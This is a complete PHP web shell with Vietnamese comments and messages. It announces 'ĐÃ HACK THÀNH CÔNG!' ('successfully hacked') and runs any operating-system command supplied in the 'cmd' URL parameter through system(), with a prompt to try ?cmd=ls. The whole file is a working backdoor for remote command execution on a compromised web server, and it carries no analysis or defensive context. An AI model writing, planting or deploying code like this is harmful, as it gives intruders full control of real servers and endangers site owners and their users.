<?php
echo "<h2 style='color: red;'>✅ ĐÃ HACK THÀNH CÔNG!</h2>";

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']); // Thực thi lệnh từ tham số cmd
    echo "</pre>";
} else {
    echo "Shell đang chạy... Hãy thêm ?cmd=ls để thử.";
}
?>
